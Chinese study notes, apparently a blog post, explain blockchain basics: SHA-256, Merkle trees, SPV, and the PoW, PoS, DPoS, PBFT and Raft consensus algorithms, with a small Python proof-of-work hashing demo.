智能属性：采用不可撤销的方式将资产与区块链联系起来，使任何人都无权占有、资产完全由个人控制、不可重复使用或双重拥有 安全提供商：基于已证实的加密技术，确保数据的完整性和可用性 不变性：区块链中的记录是不可变的 唯一性：每个交易都是唯一的，且尚未被消费 智能合约：区块链提供了一个有智能合约特性的平台，可视为区块链上的自主程序，可以封装业务逻辑和代码，以便下一步所需。智能合约同时实现了灵活性、可编程性、对于特定业务执行的特定操作，区块链用户可对此加以控制 区块链中的共识 工作量证明机制（PoW） 依赖于：在提出一个网络接受价值之前已经花费饿了足够的计算资源。用于比特币和其他加密货币。 权益证明(PoS) 理念：节点或用户在系统中具有足够的权益。如用户在系统中投入了足够的资金，因此，恶意行为获得的收益将超出执行系统攻击。应用于以太坊区块链中，生成并签订下一个区块的机会随着币龄而增加。 委托权益证明(DPoS) 对PoS的一种创新，每个节点都可以通过投票将交易的验证委托给其他节点。应用于比特股中。 流逝时间证明 使用可信执行环境（TEE）通过可靠的等待时间再领导选举过程中提供随机性和安全性。 基于保证金的共识 希望加入网络的节点在生成区块链之前存入保证金。 重要性证明 依赖于用户在系统中所拥有的权益份额，并监视用户对令牌的使用和移动，以建立信任和重要性级别。 联邦共识和联邦拜占庭共识 应用于恒星共识协议中，保留一组公开信任的对等点，并只传播由大多数受信节点验证的交易。 信誉机制 基于在网络上建立的声誉选择领导者，由其他成员投票实现。 实用拜占庭容错机制(PBFT) 实现了状态机的复制，并对拜占庭节点提供了容错机制。 基于区块链的去中心化 分布式系统：数据和计算是分布在多个节点上，计算不可能以并行方式执行，数据仅可在用户视为单一聚合系统的多个节点上进行复制。 并行系统：计算是由所有节点同步执行。 分布式系统：存在管理整个系统的中央权威机构，控制权分布在许多节点中。 去中心化系统：是节点不依赖与单个主节点的网络类型，且不存在中央权威机构。 去中心化方法存在两种方法实现去中心化：非中介化和竞争 非中介化：不通过中介机构进行相应的活动，或消除中间人或中介机构，如C2C模式；不通过银行转账，而用区块链地址进行直接转账 竞争：一组服务提供者相互竞争，以便被系统选择进而提供有效服务。在区块链系统中，智能合约可以根据声誉、评分、评论和服务质量，从大量的提供者中选择一个外部的数据提供者。当然这并不是完全的去中心化，但允许智能合约根据标准作出自由选择 去中心化流程不是所有的事务都需要去中心化的 去中心化需求条件评估： 去中心化的含义 去中心化系统可以是任何系统 去中心化所需的级别 可以是完全中介化或部分中介化 采用哪种区块链 可以选择比特币、以太坊等 采用哪种安全性机制 原子性机制，确保系统的完整性；声誉机制，支持系统中不同的受信度 区块链和完整的生态圈去中心化操作去中心化的生态系统概览如下： 存储 数据可以直接存储在区块链中，即实现了去中心化操作，但存在一个缺点：区块链不适合存储大量的数据，如图像。 去中心化存储方案： 分布式哈希表（DHT）：应用于BitTorrent，用户不会无限期的保存相关文件，如果节点脱离网络，则节点无法被检索到，除非该节点再次加入到网络，以使文件再次可用。 Inter Planetary File System（IPFS）拥有高可用性和链接稳定性，旨在通过替换HTTP协议提供一个去中心化的万维网。使用Kademlia DHT和merkle DAG（有向无环图）分别提供存储和搜索功能。 激励机制基于Filecoin协议，该协议向使用BitSwap机制存储数据的节点提供激励。 BitSwap机制允许节点保留一个简单的字节账本。 Ethereum包含自身的去中心化和分布式的生态系统，并使用集群存储和whisper协议进行通信。 Maidsafe致力于提供一个去中心化的万维网。 BigChainDB目的是提供一个可伸缩、快速和线性和伸缩的去中心化数据库，而不是传统的文件系统。 通信去中心化网络方案： Internet旨在建立一个去中心化的系统。该模型基于中央权威（服务提供者）的信任，用户并不负责管理其数据，甚至密码也可存储在受信的第三方系统上。有必要以某种方式向个别用户提供管理权限，确保用户可以访问数据，并且不依赖于第三方。（如IPFS） 网状网络：节点间可以直接对话，而不需要像服务提供商那样采用中心枢纽。例如Firechat，允许iphone用户在没有互联网的情况下以点对点的方式直接进行通信。 密码学与基本技术区块链的不可篡改性基于密码学的算法实现 密码学发展简史 密码学数学基础 对称密码机制 非对称密码机制 Hash技术哈希函数用于创建任意长度的输入字符串、固定长度的文摘，所以常用于数字签名和消息认证码中。 SHA256：输入消息大小小于264位。其中，块大小为512位，字大小为32位，输出为256位的文摘。 预处理算法： a) 如果小于512位块尺寸，填充为512位块尺寸。 b) 将消息解析为消息块，确保消息及其填充内容划分为512位的相等快。 c) 设置初始哈希值，表示为8个32位的字，是前8个素数的平方根小数的前32位。 哈希计算步骤： a) 每个消息块依次进行处理，需要64轮才能计算出全部哈希结果。其中，每一轮使用不同的常数，以确保没有两轮处于等同状态。 b) 设置消息轮询。 c) 初始化8个工作变量。 d) 计算中间哈希值。 e) 处理消息并生成输出哈希值。 ​ 在p2p网络下载网络之前，先从可信的源获得文件的Merkle Tree树根。一旦获得了树根，就可以从其他不可信的源获取Merkle tree。通过可信的树根来检查接受到的Merkle Tree。如果Merkle Tree是损坏的或者虚假的，就从其他源获得另一个Merkle Tree，直到获得一个与可信树根匹配的Merkle Tree。 特点： MT大多数是二叉树，也可以多叉树，具有树结构的所有特点 叶子节点的value是数据集合的单元数据或者单元数据HASH 非叶子节点的value是根据它下面所有的叶子节点值，然后按照Hash算法计算而得出的 优点：可以直接下载并立即验证Merkle Tree的一个分支。因为可以将文件切分成小的数据块，这样如果有一块数据损坏，仅仅重新下载这个数据块就行了。 基本密码技术的应用 EC-DH交换密钥 EC-DES签名 共识算法 可参考： [区块链] 共识算法之争(PBFT，Raft，PoW，PoS，DPoS，Ripple) 深入浅出PBFT算法原理 共识机制 区块链的底层由四部分构成 分布式数据库：用来存储以往和将来的交易数据 密码学：公钥私钥体系用来确认交易双方的身份 P2P网络：用来广播和蔓延各类消息（如节点的加入消息、节点失效消息、得到挖矿数据的消息） 共识机制：用来决定节点记账权利 区块链系统的核心是系统节点竞争记账，这个竞争过程称为共识机制 共识机制在区块链中扮演着核心地位，共识机制决定了谁有记账的权利，以及记账权利的选择过程和理由 共识机制：区块链事务达成分布式共识的算法 不同的虚拟货币采用不同的共识机制，常见的共识机制如POW、POS、DPOS、PBFT等 PoWPOW：Proof of work，工作量证明机制 POW工作量证明就是我们所熟悉的挖矿，通过与或运算，计算出一个满足规则的随机数，即获得本次记账权，发出本轮所需要记录的数据，全网其他节点验证后一起存储。这种证明方式的一个显著特征是往往需要很大的工作量才能拿到指定成果，但是这个成果很容易验证 POW工作量证明的三要素：①工作量证明函数 ②Merkle树 ③难度值 ①工作量证明函数1231.输入x可以是任意长度的字符串2.输出结果即H(x)的长度是固定的3.计算H(x)的过程是高效的 免碰撞 函数还需要免碰撞，即不会出现 x ≠ y ，但是 H(x)=H(y)。但是这个特点在理论上并不成立，对于SHA256算法，会有2^256种输出，进行2^256+1次输出，那么根据鸽巢原理，一定会产生一次碰撞。 但是从概率的角度看，随机生成K个数，他们不同的概率为 (N-1)/N × (N-2)/N × …… × (N-(k-2) )/N × (N-(k-1))/N = e-k(k-1)/2N 因此，碰撞的概率为 1-e-k(k-1)/2N 因此，从概率的角度看，sha256进行2^130次输入就会有99%的可能发生一次碰撞 不过，假设一台计算机以每秒10000次的速度进行哈希运算，要经过10^27年才能完成2^128次hash运算 如图为不同位发生hash碰撞的可能性，最右边是发生hash碰撞的可能性，左边是经过多少个数之后可能达到发生的可能性。 隐匿性 对于一个给定的输出结果H(x)，想要逆推出输入x，在计算上是不可能的。 不存在比穷举更好的方法，可以使哈希结果H(x)落在特定范围。 Block Hash = hash(本页内容，Pre Hash，时间戳) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&gt;&gt;&gt; import hashlib&gt;&gt;&gt; import re&gt;&gt;&gt; def s256(text):... c = hashlib.sha256(text.encode('utf-8'))... return text, c.hexdigest()...&gt;&gt;&gt; s256('hacking')('hacking','42d83a899f20aea7d53614d163ac6e90cf4143919324cee410dd767cf6225bbf')&gt;&gt;&gt; def cal(t, flag):... pj = 0... ans = None... while not None:... s = t + str(pj)... ans = re.match(flag, s256(s)[1])... if ans is None:... print(pj)... pj+=1... else:... print(s256(s))... break&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; flag = "0&#123;0&#125;[a-f0-9]&#123;64&#125;"&gt;&gt;&gt; cal("fuck",flag)('fuck0', '2096b072b572e7b3554ab62b542dee4136e4b3a0243be126918d035ec4a4a727')&gt;&gt;&gt; flag = "0&#123;1&#125;[a-f0-9]&#123;63&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck10', '03fc6bfae9f00fa966431f707507d7a18e201d81d564dba42b96b2a7988f3ca6')&gt;&gt;&gt; flag = "0&#123;2&#125;[a-f0-9]&#123;62&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck448','00ff7469c5332f8f5957f0acb1448d00fa4b2e281065f9202ea549a3a6ff7dba')&gt;&gt;&gt; flag = "0&#123;3&#125;[a-f0-9]&#123;61&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck7703', '0006086f65ce49afbd0479d1094463db1c7385aa1c1cd1ffedc1399404ee4fc9')&gt;&gt;&gt; flag = "0&#123;4&#125;[a-f0-9]&#123;60&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck263273', '000069e2e17d677804f76fb9b79b8f9d7654563a91a77a7d6c75ae30c6963e90')&gt;&gt;&gt; flag = "0&#123;5&#125;[a-f0-9]&#123;59&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck271481', '00000fa9aeacc3e986eaf8b8337d71c67abbd77acfd5cc8b90262f7377fdab7e')&gt;&gt;&gt; flag = "0&#123;6&#125;[a-f0-9]&#123;58&#125;"&gt;&gt;&gt; cal("fuck",flag)......('fuck9197297', '000000c91683616ac0e361c2eafc66de0757e9d46f819e86d30d2cdae1df4398')&gt;&gt;&gt; flag = "0&#123;7&#125;[a-f0-9]&#123;57&#125;"&gt;&gt;&gt; cal("fuck",flag)...... ②Merkle树Merkle树一般用于完整性验证处理。Merkle哈希树是一类基于哈希值的二叉树或多叉树，其子节点上的值通常为数据库的哈希值，而非叶子节点上的值该将该节点的所有子节点的组合结果的哈希值。将Merkle Root存入区块头里，Merkle Tree 存入区块体里。 节点生成一笔筹币交易，对于4个交易记录L1，L2，L3，L4，分别计算hash(L1)，hash(L2)，hash(L3)，hash(L4)；对于hash0=hash(hash0-0+hash0-1) 和 hash1=hash(hash1-0 + hash1-1)；计算出根节点的hash值top hash，topHash=hash(hash0+hash1)。 然后将Merkle树root的top hash值存入区块链头中，如下图 区块链中的Merkle树为二叉树，用于存储交易信息。每个交易两两配对，构成Merkle树的子节点，进而生成整个Merkle树。Merkle树使得用户可以通过从区块头得到的Merkle树根和别的用户所提供的中间哈希值列表去验证某个交易是否包含在区块中。提供中间哈希值的用户并不需要是可信的，因为伪造区块头的代价很高，而中间哈希值如果伪造的话会导致验证失败。 SPV：简化支付验证（Simplified Payment Verification），轻钱包并不保存完整的区块链，而是只保存每一个区块的区块头。区块体保存了完整的交易信息，而交易信息需要的存储量大部分都是交易头的千倍以上。所以，如果只保存交易头，就可以极大的减少本地客户端存储的区块链信息。 在交易时，发出一个MerkleBlock消息，包含区块头和一条连接目标交易与Merkle根的Merkle路径 若需验证该交易，即可通过其Merkle路径与交易hash确定一个新的Merkle Root，将其与原root相比即可。 参考： Merkle Tree 入门 密码学——Merkle树 假如有交易改变，则整个树枝会发生改变 定位的时间为O(log(n))，即二叉树的查找时间 ③难度值 新难度值 = 旧难度值 * （20160分钟 / 最近的2016个区块花费的时长） 新难度值解析：撇开就难度值，按比特币理想值情况每10分钟出块的速度，过去2016个块的总花费时间接近20160分钟，这样，这个值永远趋于1。 若过去2016个区块花费时长少于20160分，那么这个系数会小于1，否则，会大于1。 难度值越大，越难挖。因为20160分大约为14天，而比特币网络大约14天调整一次难度值。 比特币的难度和出块速度将成反比例适当调整出块速度。 目标值 = 最大目标值 / 难度值 最大目标值：一个固定数（恒量，十六进制前8位0后面56位1，即32bit0）0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF 即前N bit为0 目标值解析：若过去2016个区块花费时长少于20160分，那么难度值会变小，目标值将会被调小些；否则，目标值会被调大。 查找块的平均时间可以通过如下方式计算：time = difficulty * 2**32 / hashrate 难度值 = time (s) * hashrate (hash / s ) / (2**32) 新难度值 / 旧难度值 = 新算力 / 旧算力 如果难度为1的话，大约是每秒钟7 Mhashes https://www.cnblogs.com/zhaoweiwei/p/difficulty.html https://en.bitcoin.it/wiki/Difficulty 12345678例:计算目标值,5min产生一个区块,sha256算法,算力 400M hash/s.一个正确区块被计算,需要进行 (5*60)s * 400M hash/s = 120,000 M hash假如计算一个区块头需要1M hash , 则 计算正确头的几率为 1 / (2^17) ,(120000 ≈ 2^17)所以, (2^(256-17)) / 2^256 == 1 / 2^17所以, 目标值为: 0b0……………………011…… |-17bit0-||--(256-17)bit-- POW工作量证明流程流程如下图： 生成Merkle根哈希 组装区块头 计算出工作量证明的输出 ！！！：区块头里的随机数即是nonce 1.如上 2.组装区块头：块头将被作为计算出工作量证明输出的一个输入参数，因此第一部计算出来的Merkle根哈希和区块头的其他组成部分组装成区块头 3.计算出工作量证明的输出： ​ i) 工作量证明的输出 = SHA256( SHA256(区块头) ) ​ ii) if （工作量证明的输出 &lt; 目标值 ），证明工作量完成 ​ iii) if （工作量证明的输出 &gt;= 目标值），变更随机数(Nonce)，递归 i 的逻辑，继续与目标值比对 对这个值进行两次SHA256运算，为什么要两次，这是因为SHA1在2017年被攻破，采用的方法是birthday collision attack。社区觉得SHA2被攻破也是时间的问题，而抵御birthday collision attack的有效方法为双重哈希算法，当然这种说法只是网上传言，没有得到具体确认。 客户端产生新的交易，向全网广播 每个节点收到请求，将交易纳入区块 每个节点通过pow工作量证明 当某个节点找到了证明，向全网广播 当且仅当该区块的交易是有效的且在之前中未存在的，其他节点才认同该区块的有效性 接受该区块且在该区块的末尾制造新的区块 节点总是认为最长的链是正确的链，并致力于在最长的链上进行扩展。 如果两个节点同时完成PoW过程并广播了不一样的区块，有的节点收到其中一个，而有的节点先会收到另一个。 这种情况下，首先收到的区块会被节点作为下一个区块添加到链上，同时也会保存后到的区块。 当下一个区块来临时，就会知道哪一个区块是比较长的，然后切换到较长的区块链上。 新交易的广播不一定要到达每一个节点，只要到达足够多的节点，这些节点就会在一定时间内将交易打包到区块中 区块的广播也是允许丢包的，如果节点没有收到某一个区块，当下一个区块到来时，该节点发现新区块的prevHash不是目前最后一个区块，就会去请求丢失的区块 因为做出工作量证明的节点上没有未建块的交易，从而有可能产生空块 POW的优缺点 优点：完全去中心化，节点自由进出 缺点：目前bitcoin已经吸引了全球大部分的算力，其他再用POW共识机制的区块链应用很难获得相同算力来保障自身的安全；挖矿造成大量的资源浪费；共识达成的周期较长，不适合商业应用 POSPOS：权益证明机制（Proof of Stake），是Pow的一种升级共识机制，根据每个节点所占代币的比例和时间，等比例的降低挖矿难度，从而加快找到随机数的速度。 若Pow主要比拼的是算力，那么Pos则是比拼余额。通俗说就是当手里的币越多，挖到一个块的概率越大 POS合格区块可以表述为：F(Timestamp) = Target * Balance，与POW的F(Nonce) &lt; Target 相比，式子左边的搜索空间由Nonce 变成 Timestamp，Nonce值域是无限的，而Timestamp的值域是极其有限的，一个合格的区块时间必须在前一个区块时间的规定范围之内，时间太早或者太超前的区块都不会被其他节点接纳。式子右边的目标值引入一个乘积因子余额，课件余额越大，整体目标值（Target*Balance）越大，越容易找到一个区块。因为Timestamp 有限，POS铸造区块成功率主要与Balance有关。 Peercoin（PPC）PPC是POS的一种具体的实现方式 ​ PPC是从中本聪所创造的BTC衍生出来的一种P2P的电子密码货币，以权益证明（Proof of Stake，以下简称PoS）取代工作量证明（Proof of Work，以下简称PoW）来维护网络安全。在这种混合设计中，PoW主要在最初的采矿阶段起作用。长远来看，PPC网络的安全并不依赖能源的消耗。因此PPC是一种节能而有成本优势的P2P电子密码货币。 ​ PoS是基于币龄(coin age)并由通过与 BTC类似的由每个节点散列运算产生的，只是其搜索空间被限制了。区块链的历史及交易结算是通过一个中心化广播检查机制得到进一步保护。 ​ 要掌握Peercoin的POS机制，需要重点理解Sunny King专门为PPC设计的几个核心概念： Coinage币龄，也叫币天。假如1.5个币存在于区块链中10天，币龄数值为：Coinage = 1.5 * 10 = 15 PPC采用币龄，而不是直接采用余额（Balance）来计算。一个UTXO(未花费的交易输出)一旦被花费，其币龄被清零，新的UTXO币龄从0开始算起 stakeReward权益激励，俗称获得利息，计算公式如下：stakeReward = nCoinAge*33/(365*33+8)*0.01*COIN， 公式可简化未：stakeReward = (0.01 * nCoinAge /365) * COIN 其中，nCoinAge是CoinStake所有输入的币龄总和，由公式可知收益按1%年率计算。理想状态下，假设所有的币全年都参与挖矿，代币总量每年有1%通胀率，这一设计为很多人所诟病，而且，这一设计并不能激励矿工积极参与挖矿以维护区块链的安全，因为如果不考虑手续费，持币用户每隔几个月打开节点铸币，或者实时在线铸币，理论上收益都是一样的。 stakeMinAgePOS系统也存在51%币龄攻击风险，为了增加攻击难度，Sunny King对每一笔UTXO的铸币资格做了最小年龄（stakeMinAge）限制：一个UTXO在区块链存在的时间小于stakeMinAge则没有铸币资格，PPC最小币龄为8小时。 POS2.0黑币社区认为币龄可能会被恶意的节点滥用以获得更高的网络权重并成功实施双花攻击，于是发布POS2.0白皮书，对PPC做了几个细节优化，解决了一些潜在的安全问题，其中最重要的改进是用余额代替币龄，合格区块的条件由： F(Timastamp) &lt; Target * 币数 * 币的年龄 变为： F(Timastamp) &lt; Target * 币数 如此一来，一笔UTXO无论放置多久其锻造区块的能力不变，此举可激励节点必须更多的保持在线进行铸币，提高系统安全性，将攻击途径减少到最低限度，并且能够显著提高网络保持运行的节点数量。 POS3.0黑币社区后来进一步升级，推出POS3.0版本，对交易手续费，难度调整做了一些优化，其中最显著的改变是将1%年利率奖励机制变为固定数额奖励（每个区块固定奖励1.5BLK），此举不但降低代币通胀率（考虑到会有代币永久丢失，低额奖励机制回归总量恒定的设计思路），同时意味着持币节点必须实时在线才能获得收益。 POS的优缺点 优点：在一定程度上缩短了共识达成的时间 缺点：还需要挖矿，本质上没有解决商业应用的痛点 DPoSDPOS：股份授权股份证明（Delegated Proof-Of-Stake） https://blog.csdn.net/liankuaixy/article/details/79820710 比特股（Bitshares）项目于2013年8月开始启动，对区块链做了很多改造，并引入许多新概念和特征，尤其令人眼花缭乱的 Bitshares X、多态数字资产交易平台、资产锚定等新名词，一时令人无比兴奋而又困惑。此时POW和POS都已成功运行许久，彼此优劣已被反复讨论，两大阵营时至今日依然争论不休。按照项目规划，比特股对交易容量和区块速度有极高要求，显然POW或POS都达不到要求，于是比特股发明了一种新的共识机制DPOS，即股份授权股权证明。 DPOS是 PoS 的进化方案，在常规 PoW 和 PoS 中，一大影响效率之处在于任何一个新加入的 Block，都需要被整个网络所有节点做确认。 DPoS 优化方案​ 通过不同的策略，不定时的选中一小群节点，这一小群节点做新区块的创建，验证，签名和相互监督，这样就大幅度的减少了区块创建和确认所需要消耗的时间和算力成本。 DPOS机制涉及的问题 1. 持有股票 直接在交易平台上购买比特股即可 2. 成为代表 成为一名代表，你必须在网络上注册你的公钥，分配到一个32位的特有标识符 3. 授权选票 每个钱包有一个参数设置窗口，在该窗口里用户可以选择一个或更多的代表，并将其分级 一般情况下，用户不会创建特别以投票为目的的交易，因为那将耗费他们一笔交易费 4. 保持代表诚实 每个钱包将显示一个状态指示器，让用户知道他们的代表表现如何 5. 抵抗攻击 在抵抗攻击上，因为前100名代表所获得的权利权是相同的，每名代表都有一份相等的投票权，并且，如果当前记账节点不记账则由下一个记账人记账，因此无法通过获得超过1%的选票而将权力集中到一个单一代表上，毕竟同时收买100给代表的难度很大。同时，每名代表的标识是其公钥而非IP地址，使得DOS攻击目标更为困难（难定位） 6. 代表竞选 选出的代表拥有提出改变网络参数的特权，包括交易费用、区块大小、见证人费用和区块区间 DPOS遵循的基本原则 持股人依据所持股份行使表决权，而不是依赖挖矿竞争记账权 最大化持股人的盈利 最小化维护网络安全的费用 最大化网络的效能 最小化运行网络的成本（带宽、CPU等） DPOS的优缺点 优点： 能耗更低：DPoS机制将节点数量进一步减少，在保证网络安全的前提下，整个网络的能耗进一步降低，网络运行成本最低。 更快的确认速度：每个区块的时间为10秒，一笔交易（在得到6-10个确认后）大概1分钟，一个完整的区块的周期大概仅仅需要数分钟。而PoW机制下产生一个区块需要10分钟，一笔交易完成需要数个小时。 在一定程度上解决了拒绝服务攻击和潜在作恶节点联合作恶的问题。 缺点： 投票的积极性并不高：绝大多数持股人从未参与投票。这是因为投票需要时间、精力以及技能，而这恰恰是大多数投资者所缺乏的。 垄断性高：DPoS延续了PoS的弊端，只有持币者才可以获得区块链奖励，其实这就带来了一种制度性门槛，最终导致DPoS币的流动性大大减少，穷者越穷，富者越富。 PBFTPBFT：实用拜占庭容错算法（Practical Byzantine Fault Tolerance） 以往的区块链项目都以虚拟币为内核，而记录数据的应用不需要币机制模型。这个时候，Hyper Ledger（超级账本）应景而生，它是由Linux基金会组织牵头的项目，是一个旨在推动区块链数字技术和交易验证的开源项目。这个分布式账本技术是完全共享、透明和去中心化的，非常适合于金融行业的应用，以及其他的例如制造、银行、保险、物联网等无数个其他行业。 PBFT是Hyper Ledger中使用的共识算法 https://learnblockchain.cn/2019/08/29/pbft/ https://blog.csdn.net/jfkidear/article/details/81275974 PBFT的算法基本流程假设有f个恶意节点，则保证系统正常运作，需要有2f+1个正常节点，总结点数为3f+1 客户端发送请求给主节点 主节点广播请求给其他节点，节点执行pbft算法的三阶段共识流程 节点处理完三阶段流程后，返回消息给客户端 客户端收到来自f+1个节点相同消息后，代表共识已经正确完成 如图： C为Client，pre-prepare为预准备阶段，prepare为准备阶段，commit为提交阶段 R在一个视图里，一个是主节点，其余的都叫做备份节点，如图主节点为0，即Client首先请求主节点负责将客户端的请求排好序，然后按序发给备份节点 但是主节点可能是拜占庭的：他可能会给不同的请求编上相同的序号，或者不去分配序号，后者让相邻序号不连续。 备份节点应当有职责主动检查这些序号的合法性，并能通过timeout机制检测到主节点是否已经宕机。 当出现异常情况下，就会出发视图更换view change协议来选举出新的主节点 Requset阶段在此阶段，客户端c向主节点p发送请求，&lt;Request，operation，timestamp，clientID&gt; operation：为请求具体操作 timestamp：请求时客户端追加的时间戳 clientID：客户端标识 Requset：包含消息内容message，以及信息摘要d(message) 客户端对请求进行签名 PBFT算法预备（Pre-Prepare）在预准备阶段，主节点对签名进行校验，并分配一个序列号n给收到的请求，然后向所有备份节点群发预准备消息，预准备消息的格式为：\&lt; &lt;Pre-Prepare，v，n，d&gt; ， m &gt; v是视图编号 n是序列号 m是客户端发送的请求消息 d是请求消息m的摘要 预准备消息的目的是作为一种证明，确定该请求是在视图v中被赋予了序号n 在视图变更的过程中可以追索请求 请求本身是不包含在预准备消息中，这样能使预准备消息足够小 Prepare当节点收到pre-prepare消息后，会选择接收与否 满足下列条件时，各个备份节点才会接收一个预准备消息：①请求和预准备消息的签名正确，并且d与m的摘要一致；②当前视图编号是v；③该备份节点从未在视图v中接收过序号为n但是摘要d不同的消息m；④预准备消息的序号n必须在水线上下限h和H之间，水线存在的意义在于防止一个失效节点用一个很大的序号消耗序号空间。 如果备份节点i接受了预准备消息\&lt; &lt;Pre-Prepare，v，n，d&gt; ， m &gt;，则进入准备阶段。 在准备阶段的同时，该节点向所有副本节点发送准备消息 \&lt; Prepare，v，n，d，i &gt;，并且将预准备消息和准备消息写入自己的消息日志，可丢弃非法请求（即非法预准备消息） 节点（包括主节点）收到prepare消息后，进行验证prepare消息签名是否正确，视图编号是否一致，消息序号是否满足水线限制，若验证通过则将消息写入消息日志中。 副本节点i将（m，v，n，i）记入消息日志中，其中m是请求内容，预准备消息m在视图v中的编号n，以及2f个从不同副本节点收到的与预准备消息一致的准备消息 每个副本节点验证预准备和准备消息的一致性主要检查：视图编号v、消息序号n和摘要d Commit当prepared (m,v,n,i)条件为真的时候， 副本i生成确认消息 追加到本地消息日志文件 将确认消息向其他副本节点 广播进入了确认阶段 &lt; COMMIT，v，n，D(m)，i&gt; 每个副本节点接收Commit消息的条件是： Commit消息签名正确 上一阶段请求的摘要也是D(m) 消息的视图编号与节点的当前视图编号一致 消息的序号n满足水线条件，在h和H之间 一旦确认消息的接受条件满足了，则该副本节点将确认消息写入消息日志中 当节点收到2f+1（包括自身）个不同节点发送过来的Commit消息之后，进入Commit-local(m，v，n)状态，且所有序号小于n的请求都被处理，则执行客户端请求m中所要求的服务操作 保证在节点中提交的任意一个客户端请求，最终哦都会在另外2f个节点中被提交到本地的，并确保所有正常节点以同样顺序执行所有请求，这样就保证了算法的正确性 Reply同时将执行结果发送给客户端 \，r为请求操作结果 如果客户端收到f+1个相同的Reply消息，说明客户端发起的请求已经达到全网共识，否则客户端需要判断是否重新发送请求给主节点 副本节点会把时间戳比已回复时间戳更小的请求丢弃，以保证请求只会被执行一次 PBFT 检查点 （checkpoint） 如何清除历史请求的记录消息？ 在执行完多条请求K（例如：100条）后执行一次状态同步，即发送CheckPoint消息。&lt;CheckPoint, n, d, i&gt;，n是当前节点所保留的最后一个视图请求编号，d是对当前状态的一个摘要，该CheckPoint消息记录到log中。 如果副本节点i收到了2f+1个验证过的CheckPoint消息，则清除先前日志中的消息，并以n作为当前一个stable checkpoint。 stable checkpoint（稳定检查点）呢？ 大部分节点（2f+1）已经共识完成的最大请求序号。比如系统有4个节点，三个节点都已经共识完了的请求编号是213.那么这个213就是stable checkpoint 实际上当副本节点i向其他节点发出CheckPoint消息后，其他节点有可能还没有完成K条请求，所以不会立即对i的请求作出响应，它还会按照自己的节奏，向前行进。此时发出的CheckPoint未能形成stable，为防止i的处理请求过快，设置一个高低水位区间[h, H]来解决这个问题， 低水位h等于上一个stable checkpoint编号，高水位H = h + L，其中L是我们指定的数值（如100，或200）， 当副本节点i处理请求超过高水位H时，就会停止脚步，等待stable checkpoint发生变化，再继续前进。 算法视图变更每个副节点维持一个计数器。备份节点在接收到一个有效请求，但是还没有执行它时，会查看计时器是否在运行，如果没有，那么它将启动计时器；当请求被执行时就把计时器停止。 如果计时器超时，将会把视图变更的消息向全网广播。在主节点失效的时候仍然保证系统的活性，防止备份节点无期限地等待请求的执行。需要确保在新的view中如何来延续上一个view最终的状态， 比如给这时来的新请求的编号，比如如何处理上一个view还没来得及完全处理好的请求 计时器超时或发现作恶，副节点生成 view-change 消息 &lt;VIEW-CHANGE,v+1,n,C,P,i&gt;，最近一次的稳定检查点对应的请求的序列号 n，C 是证明该检查点稳定性的 2f+1 个 checkpoint 消息的集合，P 是 Pm 的集合，其中 m 是副节点 i 中的序列号大于 n 的等待提交和执行的客户端请求 m，每个 Pm 包含了如下的信息：①pre-prepare 消息；②2f 个由其他副节点签名的跟 pre-prepare 消息匹配的、有效的 prepare 消息； 此时，节点需要： 记录到本地日志文件中； 同时广播给其他节点； 要求替换掉主节点，变更到下一个视图 v+1； 注意，在视图变更期间，除了 checkpoint、view-change 和 newview 消息之外，备份节点 i 是不会接受其他消息的 在节点收到更换节点消息时，各个节点会收集视图变更信息，并发送确认给 view v+1 中的主节点。 （v+1 中的主节点可能是轮换产生，也可能选举产生） 新的主节点接收到 2f 个有效的 view-change 消息之后，发送自己签名σp’ 的 new-view 消息&lt;NEW-VIEW, v+1, V, O&gt; ，V是主节点收到的2f+1个有效的VIEW-CHANGE消息 ，O是主节点重新发起的未经完成的PRE-PREPARE消息集合 找到所有节点的共同的稳定检查点h。 在h和h+L之间，如果存在n消息，则创建&lt;&lt;PRE-PREPARE, v+1, n, d&gt;, m&gt;消息。否则创建一个空的PRE-PREPARE消息，即：&lt;&lt;PRE-PREPARE, v+1, n, d(null)&gt;, m(null)&gt;, m(null)空消息，d(null)空消息摘要。 对于节点v+1，提议系统内所有节点切换到下一个视图 v+1，同时接受自己成为新的主节点 副节点收到要求将视图变更为 v+1 的 new-vew 消息后，确认消息有效，接受该 new-view 消息，记录到本地消息文件中，同时将视图更换到新的视图v+1，副节点把 new-view 中携带的由新的主节点重新生成的 pre-prepare 消息追加记录到本地的消息日志中，按照检查点协议进行垃圾回收，删除比较老的消息 对于 new-vew 消息中集合 O 中携带的所有由新主节点生成的新的 pre-prepare 消息，备份节点都会生成相应的 prepare 消息，记录到本地日志文件中，转发给其他节点，即对这些未处理的请求在新的视图中重新执行一遍三阶段协议，保证视图切换过程中未处理的请求能够重新被处理。 节点选出一个checkpoint作为新view处理请求的起始状态checkpoint就是当前节点处理的最新请求序号。 checkpoint就是当前节点处理的最新请求序号。 前文已经提到主节点收到请求是会给请求记录编号的。比如一个节点正在共识的一个请求编号是101，那么对于这个节点，它的checkpoint就是101 stable checkpoint（稳定检查点）呢？ 大部分节点（2f+1）已经共识完成的最大请求序号。比如系统有4个节点，三个节点都已经共识完了的请求编号是213.那么这个213就是stable checkpoint。checkpoint的最大目的时减少内存占用。 当检查点被证明是稳定后，节点会把本地消息日志中的消息中客户端请求序列号小于或者等于 n 的消息（pre-prepare、prepare、commit 消息）都删掉。同时，它会删掉旧的检查点和 checkpoint 消息。 RAFTRAFT最初是一个用于管理复制日志的共识算法，它是一个为真实世界应用建立的协议，主要注重协议的落地性和可理解性，RAFT是在非拜占庭故障下达成共识的强一致协议 Raft算法包含三种角色，分别是：跟随者（follower），候选人（candidate）和领导者（leader）。一个节点在某一时刻只能是这三种状态的其中一种，这三种角色是可以随着时间和条件的变化而互相转换的。 所有的节点初始状态都为follower，超时未收到心跳包的follower将变身candidate并广播投票请求，获得多数投票的节点将化身leader，这一轮投票的过程是谁先发出谁有利，每个节点只会给出一次投票，leader节点周期性给其他节点发送心跳包，leader节点失效将会引发新一轮的投票过程。 Raft阶段主要分为两个，首先是leader选举过程，然后在选举出来的leader基础上进行正常操作，比如日志复制、记账等。 关于RAFT的较详细的动画，可访问 http://thesecretlivesofdata.com/raft/ 